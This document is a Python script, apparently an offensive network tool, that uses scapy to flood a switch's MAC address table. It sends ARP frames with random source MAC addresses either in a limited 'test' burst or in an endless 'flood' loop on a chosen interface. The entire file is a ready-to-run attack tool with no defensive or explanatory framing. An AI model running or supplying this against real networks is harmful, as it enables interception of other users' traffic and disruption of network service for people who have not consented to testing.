#!/usr/bin/python3

import sys
import argparse
from scapy.all import *
from colorama import Fore, Back

global GREEN, RED, YELLOW, MAGENTA, RESET
GREEN = Fore. GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET

def mac_flooding(attack, num_request):
    src_ip = "0.0.0.0" # we don't care
    dest_ip = "0.0.0.0" # we don't care
    src_mac = RandMAC() # we randomize src mac
    dest_mac = "FF:FF:FF:FF:FF:FF" # broadcast

    conf.checkIpAddr = False # To stop scapy from checking return packet originating from any packet that we have sent out

    if attack == "test":
        print(GREEN + "[+] send " +str(num_request)+ " ARP requests with "+str(num_request)+" differents MAC address in order to test if the switch is vulnerable to MAC Table Flooding" + RESET)
        for i in range(0, num_request):
            sendp(Ether(src=src_mac, dst=dest_mac)/ARP(op=2, psrc=src_ip, pdst=dest_ip, hwdst=dest_mac)/Padding(load="FL00D-"*10), verbose=False, iface=net_interface)

    elif attack == "flood":
        print(GREEN + "[+] send continuously ARP requests with differents MAC address in order to flood the MAC Table of the switch" + RESET)
        while True:
            sendp(Ether(src=src_mac, dst=dest_mac)/ARP(op=2, psrc=src_ip, pdst=dest_ip, hwdst=dest_mac)/Padding(load="FL00D-"*10), verbose=False, iface=net_interface)

    else:
        print(RED + "[-] Please choose: test/flood" + RESET)

    return True


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--type", help="test/flood")
parser.add_argument("-N", "--num_req", help="number of request")
parser.add_argument("-I", "--interface", help="interface(eth0, ...)")
args = parser.parse_args()

if args.type:
    type_attack = args.type # flood / test

    if type_attack == "test":
        if args.num_req:
            num_request = int(args.num_req)
        else:
            num_request = 5
    else:
        num_request = 0 # means infinity of requests

    global net_interface
    if args.interface:
        net_interface = args.interface
    else:
        net_interface = "eth0"
        
    mac_flooding(type_attack, num_request)
else:
    print(RED + "[-] read the help .." + RESET)



sys.exit(1)
